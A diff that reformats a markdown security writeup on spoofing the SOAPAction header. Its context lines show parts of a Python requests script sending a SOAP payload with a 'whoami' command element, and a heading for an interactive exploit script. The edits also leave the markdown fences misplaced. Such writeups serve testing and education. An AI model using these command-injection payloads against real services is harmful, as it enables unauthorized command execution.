@@ -134,9 +134,11 @@ If the server only checks the SOAPAction header, it may be possible to spoof a r
 
 <img width="812" height="572" alt="image" src="https://github.com/user-attachments/assets/e7f6f780-aee8-411c-a6ff-e334957c7d0c" />
 
-**1. Normal Request (Blocked)**
 
 ```python
+
+**1. Normal Request (Blocked)**
+
 import requests
 
 payload = '''<?xml version="1.0" encoding="utf-8"?>
@@ -172,9 +174,9 @@ payload = '''<?xml version="1.0" encoding="utf-8"?>
     <LoginRequest xmlns="http://tempuri.org/">
       <cmd>whoami</cmd>
     </LoginRequest>
-  </soap:Body>
+  </soap:Body> ```
 
-3.Interactive Exploit Script
+**3.Interactive Exploit Script**
 
 import requests
 
